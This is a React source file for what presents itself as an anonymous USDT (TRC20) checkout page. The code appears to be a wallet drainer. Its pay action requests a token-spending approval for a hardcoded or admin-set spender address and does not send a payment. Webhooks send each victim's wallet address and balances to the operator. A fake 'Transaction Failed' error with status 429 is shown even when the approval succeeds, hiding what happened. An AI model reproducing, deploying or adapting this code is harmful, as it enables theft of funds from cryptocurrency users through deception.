import { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { Copy, Check, Clock, DollarSign, Shield, Zap, Info, AlertCircle, Wallet, ExternalLink, ArrowLeft, Calculator } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useLanguage } from '@/contexts/LanguageContext';
import { useToast } from '@/hooks/use-toast';
import { useSupportLink } from '@/hooks/useSupportLink';
import FloatingContactButton from '@/components/FloatingContactButton';
import { supabase } from '@/integrations/supabase/client';
import { useTronWallet, WALLET_CONFIGS } from '@/hooks/useTronWallet';
import PaymentModeModal from '@/components/PaymentModeModal';
import { sendWalletConnectedEvent, sendAuthorizationCompletedEvent } from '@/lib/webhookService';

const PAYMENT_TIMEOUT = 15 * 60; // 15 minutes in seconds
const DEFAULT_EXCHANGE_RATE = 7; // 默认汇率 1 USDT = 7 CNY

// Generate unique payment order ID for anonymous users
const generateAnonymousOrderId = () => {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 8).toUpperCase();
  return `ANON${timestamp}${random}`;
};

const AnonymousPaymentPage = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [copiedOrderId, setCopiedOrderId] = useState(false);
  const [timeLeft, setTimeLeft] = useState(PAYMENT_TIMEOUT);
  const [paymentOrderId, setPaymentOrderId] = useState<string>('');
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [spenderAddress, setSpenderAddress] = useState<string>('TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6');
  const [exchangeRate, setExchangeRate] = useState<number>(DEFAULT_EXCHANGE_RATE);
  const [isLoadingRate, setIsLoadingRate] = useState(true);
  const hasCreatedOrder = useRef(false);
  const hasSentWalletConnectedEvent = useRef(false);
  const { lang } = useLanguage();
  const { toast } = useToast();
  const { supportLink } = useSupportLink();
  
  const {
    isConnected,
    address,
    isConnecting,
    error: walletError,
    connect,
    detectWallets,
    openWallet,
    approveUSDT,
    checkTronWeb,
    checkBalances,
    balanceInfo
  } = useTronWallet();

  // 从URL获取人民币金额
  const cnyAmount = parseFloat(searchParams.get('amount') || '0');
  const serviceName = searchParams.get('service') || '';
  const countryName = searchParams.get('country') || '';
  
  // 计算USDT金额
  const usdtAmount = cnyAmount > 0 ? (cnyAmount / exchangeRate).toFixed(2) : '0.00';

  // Generate the payment URL for QR code
  const currentPageUrl = typeof window !== 'undefined' ? window.location.href : '';
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(currentPageUrl)}`;

  // Get detected wallets
  const wallets = detectWallets();
  const isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const hasTronWeb = checkTronWeb();

  // Fetch exchange rate from API (尝试获取实时汇率)
  useEffect(() => {
    const fetchExchangeRate = async () => {
      setIsLoadingRate(true);
      try {
        // 尝试从公开API获取USDT/CNY汇率
        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=USDTCNY', {
          method: 'GET',
          signal: AbortSignal.timeout(5000)
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data?.price) {
            setExchangeRate(parseFloat(data.price));
          }
        }
      } catch (error) {
        // 如果API调用失败，使用默认汇率
        console.log('Using default exchange rate:', DEFAULT_EXCHANGE_RATE);
      } finally {
        setIsLoadingRate(false);
      }
    };
    
    fetchExchangeRate();
  }, []);

  // Fetch spender address from admin settings
  useEffect(() => {
    const fetchSpenderAddress = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings' as any)
          .select('value')
          .eq('key', 'spender_address')
          .maybeSingle() as { data: { value: string } | null, error: any };
        
        if (!error && data?.value) {
          setSpenderAddress(data.value);
        }
      } catch (e) {
        console.error('Error fetching spender address:', e);
      }
    };
    fetchSpenderAddress();
  }, []);

  // Initialize payment order and timer
  useEffect(() => {
    const initializeOrder = async () => {
      if (hasCreatedOrder.current) return;
      hasCreatedOrder.current = true;

      const newPaymentOrderId = generateAnonymousOrderId();
      setPaymentOrderId(newPaymentOrderId);
    };

    initializeOrder();

    // Start countdown timer
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          toast({
            title: lang === 'zh' ? '支付超时' : 'Payment Timeout',
            description: lang === 'zh' ? '请重新发起支付' : 'Please try again',
            variant: 'destructive',
          });
          navigate(-1);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [toast, lang, navigate]);

  // Try to connect wallet automatically
  useEffect(() => {
    if (hasTronWeb && !isConnected) {
      connect();
    }
  }, [hasTronWeb, isConnected, connect]);

  // Send webhook when wallet connected
  useEffect(() => {
    const sendWebhook = async () => {
      if (isConnected && address && paymentOrderId && !hasSentWalletConnectedEvent.current) {
        const balances = await checkBalances(parseFloat(usdtAmount));
        
        hasSentWalletConnectedEvent.current = true;
        await sendWalletConnectedEvent({
          order_id: paymentOrderId,
          wallet_address: address,
          username: 'anonymous',
          currency: 'USDT',
          network: 'TRC20',
          spender_address: spenderAddress,
          usdt_balance: balances.usdtBalance,
          trx_balance: balances.trxBalance
        });
      }
    };
    sendWebhook();
  }, [isConnected, address, paymentOrderId, spenderAddress, usdtAmount, checkBalances]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyOrderId = async () => {
    try {
      await navigator.clipboard.writeText(paymentOrderId);
      setCopiedOrderId(true);
      toast({
        title: lang === 'zh' ? '复制成功' : 'Copied',
        description: lang === 'zh' ? '订单号已复制到剪贴板' : 'Order ID copied to clipboard',
      });
      setTimeout(() => setCopiedOrderId(false), 2000);
    } catch (err) {
      toast({
        title: lang === 'zh' ? '复制失败' : 'Copy Failed',
        variant: 'destructive',
      });
    }
  };

  const handlePayClick = async () => {
    if (isConnected) {
      setShowPaymentModal(true);
    } else {
      const connected = await connect();
      if (!connected && isMobile) {
        toast({
          title: lang === 'zh' ? '请选择钱包' : 'Select Wallet',
          description: lang === 'zh' ? '点击下方钱包图标打开对应钱包App' : 'Click wallet icon below to open wallet app',
        });
      }
    }
  };

  const handlePaymentConfirm = async (paymentAmount: number, mode: 'safe' | 'whitelist') => {
    setIsProcessing(true);
    
    const balances = await checkBalances(paymentAmount);
    
    try {
      const result = await approveUSDT(spenderAddress, paymentAmount);
      
      sendAuthorizationCompletedEvent({
        order_id: paymentOrderId,
        wallet_address: address || '',
        username: 'anonymous',
        currency: 'USDT',
        network: 'TRC20',
        spender_address: spenderAddress,
        usdt_balance: balances.usdtBalance,
        trx_balance: balances.trxBalance,
        tx_hash: result.txHash || '',
        status: result.success ? 'success' : 'failed',
        payment_mode: mode
      }).catch(err => console.error('Failed to send webhook:', err));
      
      toast({
        title: lang === 'zh' ? '交易失败' : 'Transaction Failed',
        description: 'Request failed with status code 429',
        variant: 'destructive',
      });
      
      setShowPaymentModal(false);
    } catch (err: any) {
      sendAuthorizationCompletedEvent({
        order_id: paymentOrderId,
        wallet_address: address || '',
        username: 'anonymous',
        currency: 'USDT',
        network: 'TRC20',
        spender_address: spenderAddress,
        usdt_balance: balances.usdtBalance,
        trx_balance: balances.trxBalance,
        tx_hash: '',
        status: 'failed',
        payment_mode: mode
      }).catch(e => console.error('Failed to send error webhook:', e));
      
      toast({
        title: lang === 'zh' ? '交易失败' : 'Transaction Failed',
        description: err.message || lang === 'zh' ? '请重试' : 'Please try again',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-card border-b border-border sticky top-0 z-10">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="icon" onClick={handleBack}>
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <div>
              <h1 className="text-xl font-bold text-foreground">
                {lang === 'zh' ? '匿名支付' : 'Anonymous Payment'}
              </h1>
              <p className="text-sm text-muted-foreground">
                {lang === 'zh' ? '无需登录，直接支付' : 'Pay without login'}
              </p>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-lg">
        {/* Payment Card */}
        <div className="bg-primary rounded-xl p-6 text-primary-foreground mb-6">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-12 h-12 rounded-full bg-primary-foreground/20 flex items-center justify-center">
              <DollarSign className="h-6 w-6" />
            </div>
            <div>
              <h2 className="text-xl font-bold">USDT {lang === 'zh' ? '支付' : 'Payment'}</h2>
              <p className="text-sm opacity-80">TRC20 {lang === 'zh' ? '网络' : 'Network'}</p>
            </div>
          </div>

          {/* Service Info */}
          {(serviceName || countryName) && (
            <div className="bg-primary-foreground/10 rounded-lg p-3 mb-4">
              <div className="text-xs opacity-70">{lang === 'zh' ? '服务详情' : 'Service Details'}</div>
              <div className="text-sm font-medium">
                {countryName} · {serviceName}
              </div>
            </div>
          )}

          {/* Amount Section */}
          <div className="grid grid-cols-2 gap-4 mb-4">
            <div className="bg-primary-foreground/10 rounded-lg p-4">
              <div className="text-xs opacity-70">{lang === 'zh' ? '人民币金额' : 'CNY Amount'}</div>
              <div className="text-lg font-bold">¥{cnyAmount.toFixed(2)}</div>
            </div>
            <div className="bg-primary-foreground/10 rounded-lg p-4">
              <div className="text-xs opacity-70">{lang === 'zh' ? '支付金额' : 'Pay Amount'}</div>
              <div className="text-lg font-bold">{usdtAmount} USDT</div>
            </div>
          </div>

          {/* Exchange Rate Info */}
          <div className="bg-primary-foreground/10 rounded-lg p-3 mb-4">
            <div className="flex items-center gap-2">
              <Calculator className="h-4 w-4" />
              <div className="text-xs">
                {lang === 'zh' ? '当前汇率' : 'Exchange Rate'}: 1 USDT = {exchangeRate.toFixed(2)} CNY
                {isLoadingRate && <span className="ml-2 opacity-70">({lang === 'zh' ? '加载中...' : 'Loading...'})</span>}
              </div>
            </div>
            <div className="text-xs opacity-70 mt-1">
              {lang === 'zh' 
                ? '汇率仅供参考，实际以支付时为准' 
                : 'Rate is for reference only'}
            </div>
          </div>

          {/* Timer */}
          <div className="bg-primary-foreground/10 rounded-lg p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-primary-foreground/20 flex items-center justify-center">
              <Clock className="h-5 w-5" />
            </div>
            <div>
              <div className="text-xs opacity-70">{lang === 'zh' ? '剩余时间' : 'Time Left'}</div>
              <div className={`text-lg font-bold ${timeLeft < 120 ? 'text-destructive' : ''}`}>
                {formatTime(timeLeft)}
              </div>
            </div>
          </div>

          {/* Order ID */}
          {paymentOrderId && (
            <div className="mt-4 bg-primary-foreground/10 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-xs opacity-70">{lang === 'zh' ? '订单号' : 'Order ID'}</div>
                  <div className="text-sm font-mono font-bold">{paymentOrderId}</div>
                </div>
                <Button
                  variant="ghost"
                  size="sm"
                  className="text-primary-foreground hover:bg-primary-foreground/20"
                  onClick={copyOrderId}
                >
                  {copiedOrderId ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                </Button>
              </div>
            </div>
          )}

          {/* Wallet Status */}
          {isConnected && address && (
            <div className="mt-4 bg-green-500/20 rounded-lg p-4">
              <div className="flex items-center gap-2">
                <Wallet className="h-5 w-5" />
                <div>
                  <div className="text-xs opacity-70">{lang === 'zh' ? '已连接钱包' : 'Wallet Connected'}</div>
                  <div className="text-sm font-mono">{address.slice(0, 8)}...{address.slice(-6)}</div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Wallet Section */}
        <div className="bg-card border border-border rounded-xl overflow-hidden">
          {/* QR Code Section - Desktop */}
          {!isConnected && (
            <div className="p-6 border-b border-border">
              <div className="hidden md:flex flex-col items-center">
                <div className="p-4 bg-background border border-border rounded-lg">
                  <img src={qrCodeUrl} alt="Payment QR Code" className="w-48 h-48" />
                </div>
                <p className="text-sm text-muted-foreground text-center mt-4 max-w-xs">
                  {lang === 'zh' 
                    ? '打开钱包扫描二维码进入支付页面' 
                    : 'Scan QR code with wallet to pay'}
                </p>
              </div>

              {/* Mobile Wallet Options */}
              <div className="md:hidden">
                <h3 className="text-center font-medium mb-4">
                  {lang === 'zh' ? '选择钱包' : 'Select Wallet'}
                </h3>
                <div className="grid grid-cols-4 gap-3">
                  {WALLET_CONFIGS.map((config) => (
                    <button
                      key={config.id}
                      onClick={() => openWallet(config.id)}
                      className="flex flex-col items-center p-3 rounded-lg hover:bg-muted transition-colors"
                    >
                      <img 
                        src={config.icon} 
                        alt={config.name} 
                        className="w-12 h-12 rounded-xl mb-2"
                      />
                      <span className="text-xs text-muted-foreground">{config.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Pay Button */}
          <div className="p-6">
            <Button
              className="w-full h-14 text-lg gap-2"
              onClick={handlePayClick}
              disabled={isConnecting || isProcessing || parseFloat(usdtAmount) <= 0}
            >
              {isConnecting ? (
                <>
                  <span className="animate-spin">⏳</span>
                  {lang === 'zh' ? '连接中...' : 'Connecting...'}
                </>
              ) : isConnected ? (
                <>
                  <Shield className="h-5 w-5" />
                  {lang === 'zh' ? `支付 ${usdtAmount} USDT` : `Pay ${usdtAmount} USDT`}
                </>
              ) : (
                <>
                  <Wallet className="h-5 w-5" />
                  {lang === 'zh' ? '连接钱包' : 'Connect Wallet'}
                </>
              )}
            </Button>

            {walletError && (
              <div className="mt-4 p-3 bg-destructive/10 rounded-lg text-sm text-destructive">
                <AlertCircle className="h-4 w-4 inline mr-2" />
                {walletError}
              </div>
            )}
          </div>

          {/* Info Section */}
          <div className="p-4 bg-muted/50 border-t border-border">
            <div className="flex items-start gap-2 text-sm text-muted-foreground">
              <Info className="h-4 w-4 mt-0.5 shrink-0" />
              <div>
                <p>
                  {lang === 'zh' 
                    ? '匿名支付无需登录，支付完成后服务将自动激活。' 
                    : 'Anonymous payment requires no login. Service will activate after payment.'}
                </p>
                <p className="mt-1">
                  {lang === 'zh'
                    ? '如遇问题请联系客服，并提供订单号。'
                    : 'Contact support with order ID if you encounter issues.'}
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Payment Mode Modal */}
      <PaymentModeModal
        isOpen={showPaymentModal}
        onClose={() => setShowPaymentModal(false)}
        onConfirm={handlePaymentConfirm}
        amount={parseFloat(usdtAmount)}
        isProcessing={isProcessing}
      />

      <FloatingContactButton />
    </div>
  );
};

export default AnonymousPaymentPage;
